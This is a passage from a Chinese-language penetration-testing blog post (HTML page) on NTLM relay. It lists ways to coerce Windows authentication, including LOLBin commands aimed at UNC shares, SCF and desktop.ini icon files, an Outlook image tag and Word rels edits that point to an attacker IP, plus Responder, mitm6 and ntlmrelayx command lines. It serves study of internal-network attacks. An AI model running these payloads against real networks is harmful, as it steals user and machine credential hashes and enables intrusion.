<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="NTLM Relay是我之前一直忽略的内网横向移动方式，最近发现这个方式在一些场景下有不错的利用价值，搜集了一些网上的资料，整理了一下关于NTLM Relay从触发到利用，其中会涉及到的特性，以及我觉得合适的利用场景。尽可能全面地将这种内网攻击方式总结出来。  触发方式系统命令（鸡肋）123456789101112131415161718192021222324252627282930313233">
<meta property="og:type" content="article">
<meta property="og:title" content="关于NTLM relay">
<meta property="og:url" content="http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/index.html">
<meta property="og:site_name" content="5gstudent&#39;s blog">
<meta property="og:description" content="NTLM Relay是我之前一直忽略的内网横向移动方式，最近发现这个方式在一些场景下有不错的利用价值，搜集了一些网上的资料，整理了一下关于NTLM Relay从触发到利用，其中会涉及到的特性，以及我觉得合适的利用场景。尽可能全面地将这种内网攻击方式总结出来。  触发方式系统命令（鸡肋）123456789101112131415161718192021222324252627282930313233">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_world_rels.png">
<meta property="og:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_ntlm_relay_mitigation_chart.png">
<meta property="og:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_NTLM%20relay.png">
<meta property="article:published_time" content="2024-01-11T07:08:48.000Z">
<meta property="article:modified_time" content="2024-01-11T07:35:00.883Z">
<meta property="article:author" content="5gstudent">
<meta property="article:tag" content="横向移动">
<meta property="article:tag" content="内网渗透">
<meta property="article:tag" content="NTLM relay">
<meta property="article:tag" content="NTLM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_world_rels.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>关于NTLM relay</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/5gstudent">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/11/25/ADCS-ESC1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&text=关于NTLM relay"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&is_video=false&description=关于NTLM relay"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=关于NTLM relay&body=Check out this article: http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&name=关于NTLM relay&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&t=关于NTLM relay"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">触发方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%EF%BC%88%E9%B8%A1%E8%82%8B%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">系统命令（鸡肋）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.2.</span> <span class="toc-text">钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scf-%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">scf 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#desktop-ini"><span class="toc-number">1.2.2.</span> <span class="toc-text">desktop.ini</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%A4%B4%E5%83%8F"><span class="toc-number">1.2.3.</span> <span class="toc-text">用户头像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#office"><span class="toc-number">1.2.4.</span> <span class="toc-text">office</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#outlook"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">outlook</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PDF"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">PDF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#word-%E6%96%87%E6%A1%A3%E7%9A%84-document-xml-xrels"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">word 文档的 document.xml.xrels</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WordPad-OLE-%E6%B3%84%E9%9C%B2-Hash"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">WordPad OLE 泄露 Hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Access-Linked-Table-Feature"><span class="toc-number">1.2.4.5.</span> <span class="toc-text">Access Linked Table Feature</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8A%95%E6%AF%92"><span class="toc-number">1.3.</span> <span class="toc-text">内网投毒</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LLMNR-NBNS-M-DNS"><span class="toc-number">1.3.1.</span> <span class="toc-text">LLMNR NBNS (M)DNS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WPAD%E5%92%8Cmitm6"><span class="toc-number">1.3.2.</span> <span class="toc-text">WPAD和mitm6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞触发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Coerce"><span class="toc-number">1.4.1.</span> <span class="toc-text">Coerce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.2.</span> <span class="toc-text">* 打印机漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PetitPotam%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.3.</span> <span class="toc-text">* PetitPotam漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL"><span class="toc-number">1.4.4.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS"><span class="toc-number">1.4.5.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AD-CS-PKI"><span class="toc-number">1.4.6.</span> <span class="toc-text">AD CS&#x2F;PKI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">2.1.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E7%BB%A7"><span class="toc-number">2.2.</span> <span class="toc-text">中继</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2"><span class="toc-number">2.2.1.</span> <span class="toc-text">协议转换</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELDAP%E7%AD%BE%E5%90%8D"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">关于LDAP签名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB2SMB"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">SMB2SMB</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB2LDAP"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">SMB2LDAP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Relay2SMB"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">Relay2SMB</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Relay2HTTP"><span class="toc-number">2.2.1.5.</span> <span class="toc-text">Relay2HTTP</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%90%91"><span class="toc-number">2.2.2.</span> <span class="toc-text">利用方向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.3.</span> <span class="toc-text">配合利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-SAM-hashs"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">获取 SAM hashs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-ADCS-%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">针对 ADCS 的攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA%E8%B5%84%E6%BA%90%E7%9A%84-RBCD-%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.3.3.</span> <span class="toc-text">针对 域内主机资源的 RBCD 攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-%E5%BD%93%E5%89%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.3.4.</span> <span class="toc-text">针对 当前计算机的攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.3.5.</span> <span class="toc-text">针对 影子账户的攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.4.</span> <span class="toc-text">工具利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ntlmrelay%E7%9A%84Socks%E5%8A%9F%E8%83%BD"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">ntlmrelay的Socks功能</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%80%A7"><span class="toc-number">3.</span> <span class="toc-text">特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">特性利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#session%E7%AD%BE%E5%90%8D"><span class="toc-number">3.1.1.</span> <span class="toc-text">session签名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E9%9B%86%E5%B7%A5%E5%85%B7"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">搜集工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIC"><span class="toc-number">3.1.2.</span> <span class="toc-text">MIC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EPA"><span class="toc-number">3.1.3.</span> <span class="toc-text">EPA</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-number">4.</span> <span class="toc-text">场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E8%83%BD%E7%94%A8%E7%9A%84linux%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">没有能用的linux？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E6%83%B3"><span class="toc-number">4.2.</span> <span class="toc-text">设想</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        关于NTLM relay
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">5gstudent</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-01-11T07:08:48.000Z" class="dt-published" itemprop="datePublished">2024-01-11</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a> › <a class="category-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a> › <a class="category-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM-relay/">NTLM relay</a> › <a class="category-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM-relay/NTLM/">NTLM</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/NTLM/" rel="tag">NTLM</a>, <a class="p-category" href="/tags/NTLM-relay/" rel="tag">NTLM relay</a>, <a class="p-category" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>, <a class="p-category" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="tag">横向移动</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>NTLM Relay是我之前一直忽略的内网横向移动方式，最近发现这个方式在一些场景下有不错的利用价值，搜集了一些网上的资料，整理了一下关于NTLM Relay从触发到利用，其中会涉及到的特性，以及我觉得合适的利用场景。尽可能全面地将这种内网攻击方式总结出来。</p>
<hr>
<h2 id="触发方式"><a href="#触发方式" class="headerlink" title="触发方式"></a>触发方式</h2><h3 id="系统命令（鸡肋）"><a href="#系统命令（鸡肋）" class="headerlink" title="系统命令（鸡肋）"></a>系统命令（鸡肋）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">net.exe use \hostshare</span><br><span class="line">attrib.exe \hostshare</span><br><span class="line">bcdboot.exe \hostshare</span><br><span class="line">bdeunlock.exe \hostshare</span><br><span class="line">cacls.exe \hostshare</span><br><span class="line">certreq.exe \hostshare #(noisy, pops an error dialog)</span><br><span class="line">certutil.exe \hostshare</span><br><span class="line">cipher.exe \hostshare</span><br><span class="line">ClipUp.exe -l \hostshare</span><br><span class="line">cmdl32.exe \hostshare</span><br><span class="line">cmstp.exe /s \hostshare</span><br><span class="line">colorcpl.exe \hostshare #(noisy, pops an error dialog)</span><br><span class="line">comp.exe /N=0 \hostshare \hostshare</span><br><span class="line">compact.exe \hostshare</span><br><span class="line">control.exe \hostshare</span><br><span class="line">convertvhd.exe -source \hostshare -destination \hostshare</span><br><span class="line">Defrag.exe \hostshare</span><br><span class="line">diskperf.exe \hostshare</span><br><span class="line">dispdiag.exe -out \hostshare</span><br><span class="line">doskey.exe /MACROFILE=\hostshare</span><br><span class="line">esentutl.exe /k \hostshare</span><br><span class="line">expand.exe \hostshare</span><br><span class="line">extrac32.exe \hostshare</span><br><span class="line">FileHistory.exe \hostshare #(noisy, pops a gui)</span><br><span class="line">findstr.exe * \hostshare</span><br><span class="line">fontview.exe \hostshare #(noisy, pops an error dialog)</span><br><span class="line">fvenotify.exe \hostshare #(noisy, pops an access denied error)</span><br><span class="line">FXSCOVER.exe \hostshare #(noisy, pops GUI)</span><br><span class="line">hwrcomp.exe -check \hostshare</span><br><span class="line">hwrreg.exe \hostshare</span><br><span class="line">icacls.exe \hostshare</span><br><span class="line">licensingdiag.exe -cab \hostshare</span><br><span class="line">lodctr.exe \hostshare</span><br><span class="line">lpksetup.exe /p \hostshare /s</span><br><span class="line">makecab.exe \hostshare</span><br><span class="line">msiexec.exe /update \hostshare /quiet</span><br><span class="line">msinfo32.exe \hostshare #(noisy, pops a &quot;cannot open&quot; dialog)</span><br><span class="line">mspaint.exe \hostshare #(noisy, invalid path to png error)</span><br><span class="line">msra.exe /openfile \hostshare #(noisy, error)</span><br><span class="line">mstsc.exe \hostshare #(noisy, error)</span><br><span class="line">netcfg.exe -l \hostshare -c p -i foo</span><br></pre></td></tr></table></figure>

<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><h4 id="scf-文件"><a href="#scf-文件" class="headerlink" title="scf 文件"></a>scf 文件</h4><p>新建test.scf，写入内容，放在一个文件夹底下，当用户访问该<strong>文件夹</strong>的时候，我们就会获得用户的net-ntlm hash。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.10.200\scf\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<h4 id="desktop-ini"><a href="#desktop-ini" class="headerlink" title="desktop.ini"></a>desktop.ini</h4><p>文件夹底下都有个文件desktop.ini来指定文件夹图标之类的。默认不可见。去掉隐藏受保护的操作系统文件就可以看到</p>
<p>例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[.ShellClassInfo]</span><br><span class="line">IconResource=\\10.10.10.200\\system32\imageres.dll,-112</span><br></pre></td></tr></table></figure>

<p>用户访问文件夹就会有hash</p>
<h4 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h4><p>适用于Windows 10&#x2F;2016&#x2F;2019</p>
<p>用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问10.10.10.200，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。</p>
<p>直接设置会发送用户hash</p>
<h4 id="office"><a href="#office" class="headerlink" title="office"></a>office</h4><h5 id="outlook"><a href="#outlook" class="headerlink" title="outlook"></a>outlook</h5><p>发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;\\172.16.100.1\outlook&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h5><p>PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件。我们直接使用三好学生的脚本<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Worse-PDF">https://github.com/3gstudent/Worse-PDF</a></p>
<p>用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行。</p>
<p>在实际测试中使用Adobe，发现会有提示</p>
<h5 id="word-文档的-document-xml-xrels"><a href="#word-文档的-document-xml-xrels" class="headerlink" title="word 文档的 document.xml.xrels"></a>word 文档的 document.xml.xrels</h5><p>首先新建一个word，贴近一张图片</p>
<p>然后用7zip 打开(没测试其他软件，可自行测试)</p>
<p>进入word_rels，修改document.xml.rels</p>
<p>可以看到Target参数本来是本地的路径</p>
<p>修改为UNC路径，然后加上TargetMode&#x3D;”External”</p>
<p><img src="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_world_rels.png" alt="img"></p>
<p>当打开word的时候,我们就拿到net-ntlm hash</p>
<h5 id="WordPad-OLE-泄露-Hash"><a href="#WordPad-OLE-泄露-Hash" class="headerlink" title="WordPad OLE 泄露 Hash"></a>WordPad OLE 泄露 Hash</h5><p>漏洞编号是 CVE-2023-36563</p>
<h5 id="Access-Linked-Table-Feature"><a href="#Access-Linked-Table-Feature" class="headerlink" title="Access Linked Table Feature"></a>Access Linked Table Feature</h5><p><a target="_blank" rel="noopener" href="https://research.checkpoint.com/2023/abusing-microsoft-access-linked-table-feature-to-perform-ntlm-forced-authentication-attacks/">链接</a></p>
<h3 id="内网投毒"><a href="#内网投毒" class="headerlink" title="内网投毒"></a>内网投毒</h3><h4 id="LLMNR-NBNS-M-DNS"><a href="#LLMNR-NBNS-M-DNS" class="headerlink" title="LLMNR NBNS (M)DNS"></a>LLMNR NBNS (M)DNS</h4><p>windows 解析域名的顺序是</p>
<ul>
<li>这个主机名是不是自己</li>
<li>DNS 缓存</li>
<li>Hosts</li>
<li>DNS&#x2F;MDNS 请求</li>
<li>NBNS</li>
<li>LLMNR</li>
</ul>
<p>如果Hosts文件里面不存在，就会使用DNS解析。如果DNS解析失败，就会使用LLMNR解析，如果LLMNR解析失败，就会使用NBNS解析</p>
<p>利用responsder</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responsder -I eth0 ...</span><br></pre></td></tr></table></figure>

<h4 id="WPAD和mitm6"><a href="#WPAD和mitm6" class="headerlink" title="WPAD和mitm6"></a>WPAD和mitm6</h4><p>在可以使用 ipv6 的情况(Windows Vista 以后默认开启), 攻击者能接收到其他机器的 dhcpv6 组播包的情况下，攻击者最后可以让受害者的 DNS 设置为攻击者的 IPv6 地址。受害者会查询wpad并通过wpad上网，攻击者返回407受害者就会进行认证。</p>
<p><em>需要目标机器开启ipv6，且目标机器的dns地址不能写死（包括ipv4的dns地址，否则复现不了）</em>，会改目标机器的DNS，会导致对方DNS解析出问题，工具开发者说会在一段时间后恢复</p>
<p>例子：</p>
<p>mitim6</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mitm6 -i eth2 -d adlab1.local</span><br></pre></td></tr></table></figure>

<p>mtlmrelayx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 通过下面的命令成功获取到了ldap的信息，从任何机器到域控</span><br><span class="line">impacket-ntlmrelayx -6 -t ldaps://10.10.10.1 -wh testwpad.adlab1.local</span><br><span class="line"># 通过如下命令可以在从域控到普通机器，域控之间不行，应该是签名的问题</span><br><span class="line">impacket-ntlmrelayx -6 -t smb://10.10.10.1 -wh testwpad.adlab1.local</span><br></pre></td></tr></table></figure>

<h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><h4 id="Coerce"><a href="#Coerce" class="headerlink" title="Coerce"></a>Coerce</h4><p>Coercer是一个用于自动强制Windows服务器在任意机器上进行身份验证的Python脚本。</p>
<p>核心功能</p>
<ul>
<li>列出远程机器上的开放SMB管道。</li>
<li>尝试连接远程机器上已知的SMB管道列表。</li>
<li>逐个调用易受攻击的RPC函数。</li>
<li>生成随机UNC路径，以避免缓存失败的尝试。</li>
<li>可配置尝试之间的延迟。</li>
</ul>
